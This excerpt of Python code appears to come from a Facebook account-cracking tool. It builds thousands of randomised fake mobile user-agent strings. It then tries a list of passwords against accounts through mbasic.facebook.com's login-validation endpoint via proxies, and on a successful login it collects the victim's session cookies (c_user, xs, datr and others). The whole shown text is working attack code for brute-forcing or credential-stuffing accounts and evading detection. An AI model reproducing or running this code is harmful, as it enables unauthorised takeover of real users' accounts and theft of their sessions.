...
for xd in range(10000):
    ...
    b, c = random.randrange(1, 9), random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g, h, i, j = random.randrange(1, 9), random.randrange(1, 4), random.randrange(1, 4), random.randrange(1, 4)
    ...
    c, d, e, f = ' en-us; GT-', random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ"), random.randrange(1, 999), random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h, i, j, k = random.randrange(73, 100), '0', random.randrange(4200, 4900), random.randrange(40, 150)
    ...
    for x in range(10):
        ...
        b, c = random.randrange(100, 9999), random.randrange(100, 9999)
        d, e, f, g = [random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(4)]
        h = random.randrange(1, 9)
        i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j, k = random.randrange(1, 9), random.randrange(1, 9)
        l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uak = f"{a}{b}/{c}{d}{e}{f}{g}{i}{j}.{k} {l}"
        baru.append(uak)
...
def mbasibhc(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
            if "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = ("datr="+ coki["datr"]+ ";"+ ("sb=" + coki["sb"])+ ";"+ "locale=id_ID"+ ";"+ ("c_user=" + coki["c_user"])+ ";"+ ("xs=" + coki["xs"])+ ";"+ ("fr=" + coki["fr"])+ ";")
